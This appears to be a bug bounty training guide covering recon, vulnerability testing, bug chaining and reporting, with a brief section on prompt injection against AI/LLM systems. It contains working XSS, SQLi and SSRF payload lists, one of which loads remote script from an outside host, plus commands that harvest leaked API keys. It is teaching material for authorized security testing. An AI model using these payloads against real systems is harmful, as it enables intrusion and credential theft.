# Bug Bounty Training Guide 2026 — Complete Reference

## Core Principles (from top 1% hunters)

1. **Depth over breadth** — Focus on 2-3 programs, not 50. Deep knowledge of one app beats shallow testing of many.
2. **Recon is 80%** — Most bugs are missed because the asset wasn't discovered, not because testing was weak.
3. **Business logic > technical vulns** — 73% of top hunters prioritize business logic flaws over technical bugs.
4. **Chain everything** — A medium IDOR + low SSRF = critical. Single bugs rarely pay top bounties.
5. **Client-side is king** — Browser internals, execution contexts, SOP, CSP bypasses are non-negotiable skills.

## The 5-Phase Non-Linear Workflow

```
PHASE 0: SESSION START
  Define target + select 1-2 vuln classes + set success criteria

PHASE 1: RECON
  Passive OSINT → Active enumeration → JS analysis → Cloud assets

PHASE 2: MAPPING
  Parameter analysis → Auth mapping → API discovery → Technology fingerprinting

PHASE 3: DISCOVERY (Ebb & Flow)
  Pick 3-5 vectors → test briefly → return to recon → repeat

PHASE 4: PROVE & ESCALATE
  Chain bugs → escalate severity → build PoC

PHASE 5: VALIDATE & REPORT
  Verify 3x → CVSS score → write report → submit
```

## Phase 0 — Scope & Program Analysis

Before ANY tool runs:
```
1. Read program scope TWICE — highlight in-scope vs out-of-scope
2. Check safe harbor language and disclosure policy
3. Identify high-value targets: auth, payment, PII, admin
4. Fingerprint tech stack: Wappalyzer, WhatWeb, curl headers
5. Test environment availability (dev/staging/QA)
```

### Program Selection Strategy
- **VDP vs Bounty**: VDPs are for practice; focus on bounty programs
- **Wildcard scope**: Good for recon practice, slow for earnings
- **Narrow scope** (`app.target.com`): Faster to find bugs, better for beginners
- **Top programs by payout**: Apple ($5M), Google ($1.5M), Uniswap ($15.5M), Microsoft ($250K)

## Phase 1 — Reconnaissance (Deep)

### Passive Recon (zero target interaction)
```bash
# Subdomain enumeration
subfinder -d target.com -all -recursive -silent | tee subs.txt
assetfinder --subs-only target.com >> subs.txt
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\\n/\n/g' | sort -u >> subs.txt

# Historical URLs
gau --subs target.com | uro > urls.txt
waybackurls target.com | uro >> urls.txt
~/scripts/alienvault.sh target.com >> urls.txt

# OSINT
theHarvester -d target.com -b all
amass intel -org "Target Company"
```

### Active Recon
```bash
# Resolve + live check
cat subs.txt | sort -u | dnsx -silent -o resolved.txt
httpx -l resolved.txt -ports 80,443,8080,8443,3000,5000,8000,8888,9000 -silent -o live.txt

# Port scanning
naabu -l live.txt -top-ports 1000 -o ports.txt
naabu -l live.txt -p - -rate 1000 -o all_ports.txt  # full scan (slow)

# Service fingerprint
~/scripts/naabutonmap.py -i ports.txt -o nmap_scan/
```

### URL & JS Analysis
```bash
# Parameterized URLs
cat urls.txt | grep -E '\?[^=]+=.+$' > params.txt

# JavaScript extraction
cat urls.txt | grep "\.js$" | httpx -silent > js_files.txt
cat js_files.txt | while read url; do
  curl -s "$url" | grep -oP 'https?://[^"'"'"' ]+' | sort -u
  curl -s "$url" | grep -oP 'AIza[0-9A-Za-z_-]{35}'  # Google API keys
  curl -s "$url" | grep -oP 'sk_live_|pk_live_[0-9a-zA-Z]+'  # Stripe keys
  curl -s "$url" | grep -oP 'AKIA[0-9A-Z]{16}'  # AWS keys
done

# SecretFinder
python3 SecretFinder.py -i js_files.txt -o cli
```

### Cloud Asset Discovery
```bash
# S3 buckets
for bucket in $(cat words.txt); do
  curl -s "https://${bucket}.s3.amazonaws.com" | grep -q "ListBucketResult" && echo "OPEN: $bucket"
  curl -s "https://${bucket}.s3.ap-south-1.amazonaws.com" | grep -q "ListBucketResult" && echo "OPEN: $bucket"
done

# GitHub dorking
# org:target "password" "api_key" "secret" "token" "aws"
# "target.com" "DB_PASSWORD" "PRIVATE KEY"
```

## Phase 2 — Mapping & Analysis

### Parameter Significance Chart
| Parameter Pattern | Likely Vuln |
|------------------|-------------|
| `url=`, `src=`, `dest=`, `feed=`, `webhook=`, `callback=` | SSRF |
| `file=`, `page=`, `template=`, `path=`, `include=`, `load=`, `read=` | LFI/RFI |
| `id=`, `user_id=`, `order=`, `invoice=`, `doc=`, `account=` | IDOR |
| `redirect=`, `next=`, `returnTo=`, `goto=`, `url=` | Open Redirect |
| `q=`, `search=`, `name=`, `title=`, `comment=`, `message=` | XSS / SSTI / SQLi |
| `cmd=`, `exec=`, `shell=`, `ping=`, `host=`, `command=` | Command Injection |
| XML body, SVG upload, DOCX/XLSX | XXE |

### Technology-Specific Attack Vectors
| Tech | What to Check |
|------|---------------|
| **Spring Boot** | `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/refresh` |
| **Django** | `/admin/`, `/api/`, `DEBUG=True` in errors, `SECRET_KEY` exposure |
| **Rails** | `/rails/info/properties`, `secret_key_base`, mass assignment |
| **Express/Node** | `/.env`, `/debug`, `X-Powered-By`, prototype pollution |
| **Next.js** | React2Shell (CVE-2025-55182), RSC Flight protocol, `__rsc=` param |
| **GraphQL** | Introspection, batching, depth limit bypass, auth bypass |
| **WordPress** | `wp-json/`, debug.log, `wp-config.php.bak`, plugin CVEs |
| **IIS** | Shortname disclosure, `web.config` exposure, viewstate RCE |
| **AWS** | S3 buckets, IMDS (169.254.169.254), Lambda invocation |

## Phase 3 — Vulnerability Discovery (Ebb & Flow)

### Testing Priority Order
```
1. RCE / Code Execution      (highest impact)
2. SQL Injection             (data extraction)
3. Authentication Bypass     (account takeover)
4. SSRF                      (internal access)
5. IDOR / Broken Access      (data exposure)
6. SSTI                      (server compromise)
7. XSS                       (client compromise)
8. LFI / Path Traversal      (file read)
9. CORS Misconfiguration     (cross-origin data)
10. Open Redirect            (phishing)
11. CSRF                     (state-changing actions)
12. Information Disclosure   (intel gathering)
```

### Quick Win Checklist (30 min per target)
```
[ ] Subdomain takeover — nuclei -t takeovers/
[ ] Spring Boot actuators — /actuator, /actuator/env, /actuator/heapdump
[ ] Config files — /.env, /.git/config, /dump.sql, /wp-config.php.bak
[ ] CORS misconfig — curl -H "Origin: https://evil.com"
[ ] Directory listing — common paths from wordlist
[ ] S3 buckets — company-name.s3.amazonaws.com
[ ] JWT none-alg — jwt.io modify alg to "none"
[ ] GraphQL introspection — {"query":"{__schema{types{name}}}"}
[ ] Debug endpoints — /debug, /api/debug, /console, /phpinfo.php
[ ] Backup files — .bak, .old, .backup, ~ (vim swap)
```

### XSS Deep Testing
```javascript
// Context probes
?id=test             // HTML body context
?id=<test>           // Tag filtering?
?id="test            // Double quote escaping?
?id='test            // Single quote?
?id=test{{7*7}}      // SSTI?
?id=${7*7}           // JS template literal?
?id=test/*test*/     // Comment injection?

// WAF bypass order
1. <script>alert(1)</script>                    // Basic
2. <img src=x onerror=alert(1)>                 // Event handler
3. <svg onload=alert(1)>                        // SVG namespace
4. <body onload=alert(1)>                       // Body event
5. <details open ontoggle=alert(1)>             // Obscure event
6. <input autofocus onfocus=alert(1)>           // Focus event
7. <marquee onstart=alert(1)>                   // Legacy tag
8. "><script>alert(1)</script>                  // Attribute break
9. </script><script>alert(1)</script>           // Script break

// Blind XSS
"><img src=x id=BLIND_XSS onerror=eval(atob('PAYLOAD'))>
"><script src=https://collaborator.net/hook.js></script>
```

### SQLi Deep Testing
```sql
-- Detection
' OR '1'='1
' OR 1=1--
" OR "1"="1
1' ORDER BY 1--
1' GROUP BY 1--
' UNION SELECT NULL--
' AND SLEEP(5)--
' WAITFOR DELAY '0:0:5'--
' AND 1=1--
' AND 1=2--

-- Time-based blind
' IF (1=1) WAITFOR DELAY '0:0:5'--
' OR IF(1=1, SLEEP(5), 0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- WAF bypass SQLi
' /\*!UNION\*/ /\*!SELECT\*/ 1,2,3--
' uNiOn SeLeCt 1,2,3--
' UN%49ON SEL%45CT 1,2,3--
' UNION%0ASELECT%0A1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' UniOn(SeLeCt(1),(2),(3))--
' UNION ALL SELECT 1,2,3--
'/**/UNION/**/SELECT/**/1,2,3--
```

### SSRF Testing (see also SSRF_ADVANCED.md)
```bash
# Detection
cb collaborator every endpoint
curl -s "https://target.com/fetch?url=http://burpcollaborator.net/test"

# Internal targets
http://127.0.0.1:8080/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://0/
http://169.254.169.254/latest/meta-data/    # AWS IMDS
http://metadata.google.internal/             # GCP
http://100.100.100.200/latest/meta-data/     # Alibaba

# Protocol flexibility
gopher://redis:6379/_*2%0d%0a$4...
file:///etc/passwd
dict://127.0.0.1:6379/info
```

## Phase 4 — Chaining Vulnerabilities (see CHAINING_VULNS.md)

### Proven Chain Patterns
| Chain | Result | Typical Payout |
|-------|--------|---------------|
| SSRF → internal API → RCE | Server compromise | $10K-$50K |
| Auth bypass → IDOR → data exfil | Mass breach | $5K-$25K |
| XSS → CSRF → admin action | Privilege escalation | $3K-$15K |
| Info disclosure → cred reuse → ATO | Account takeover | $5K-$20K |
| Open redirect → OAuth theft → ATO | Account takeover | $3K-$15K |
| GraphQL introspection → mutation → priv esc | Priv escalation | $2K-$10K |

## Phase 5 — Reporting (see reporter.md)

### Report Quality Checklist
- [ ] Title: `[VulnType] - [Endpoint] - [Brief Description]`
- [ ] Description explains WHAT, HOW, and WHY
- [ ] Impact is specific (not "attacker can steal data")
- [ ] Steps to reproduce work when followed exactly
- [ ] PoC includes working curl command
- [ ] CVSS score matches severity
- [ ] CWE reference included
- [ ] Recommendations are specific and actionable
- [ ] No placeholders or "replace this" text

## Platform-Specific Tips

### HackerOne
- Use CWE mapping for vulnerability types
- Can edit reports before triage
- Disclosure requires program consent

### Bugcrowd
- Uses VRT (Vulnerability Rating Taxonomy) for severity
- P1 = Critical, P2 = High, P3 = Medium, P4 = Low, P5 = Informational

### BugBase
- Non-editable after submission — get it right first time
- CVSS calculator built in
- Max video: 25MB
- Template: Scope → Type → Severity → Title → Summary → PoC → Impact → Steps → Specifics → Recommendations

## 2026 Emerging Attack Surface

### AI/LLM Security
- Prompt injection (direct + indirect)
- Training data extraction
- Model denial of service
- Supply chain (malicious plugins/tools)
- Sensitive information disclosure in outputs

### WebAuthn/Passkey
- Credential ID prediction
- Policy bypass
- Cross-origin attacks

### SAML 2.0
- XML signature wrapping
- Assertion injection
- Response tampering

### WebAssembly (WASM)
- Memory safety issues
- Sandbox escapes via WASI APIs
- Reversing WASM binaries

### Web3/DeFi
- Flash loan attacks
- Oracle manipulation
- Reentrancy (read-only)
- Governance attacks

## Training Resources

### Practice Labs
| Platform | Focus | URL |
|----------|-------|-----|
| PortSwigger Academy | Web security (all vulns) | portswigger.net/web-security |
| HackTheBox | Full pentesting | hackthebox.com |
| TryHackMe | Beginner-friendly | tryhackme.com |
| OWASP WebGoat | Web app training | github.com/WebGoat/WebGoat |
| DVWA | PHP/MySQL vulns | github.com/digininja/DVWA |
| PentesterLab | Web challenges | pentesterlab.com |
| Root-Me | CTF challenges | root-me.org |
| PicoCTF | Gamified challenges | picoctf.com |

### GitHub Methodology Repos
| Repo | Stars | Focus |
|------|-------|-------|
| jhaddix/tbhm | 4357⭐ | Full bug hunter methodology |
| su6osec/HuntBook | New | 2026 comprehensive methodology |
| byoniq/BugBountyMethod | Active | Tool-linked checklists |
| The-XSS-Rat/SecurityTesting | Active | 2026 practical guide |
| Ian-Kimori/Ethical-Hacking | Active | 14-phase full pentest |
| SaadBaig/Pentesting-Methodology | Active | Pentesting cheatsheet |
| HackTricks | 35K⭐ | Ultimate pentest reference |

### Books
- "The Web Application Hacker's Handbook" — Stuttard & Pinto
- "Real-World Bug Hunting" — Peter Yaworski
- "Bug Bounty Bootcamp" — Vickie Li
- "Hacking: The Art of Exploitation" — Jon Erickson
- "Red Team Field Manual" — Ben Clark

### YouTube Channels
| Channel | Focus |
|---------|-------|
| NahamSec (Ben Sadeghipour) | Bug bounty mindset + methodology |
| STÖK | Bug bounty workflows |
| InsiderPhD | Web security + methodology |
| PwnFunction | Web security explained |
| IppSec | HTB walkthroughs |
| John Hammond | Security general |
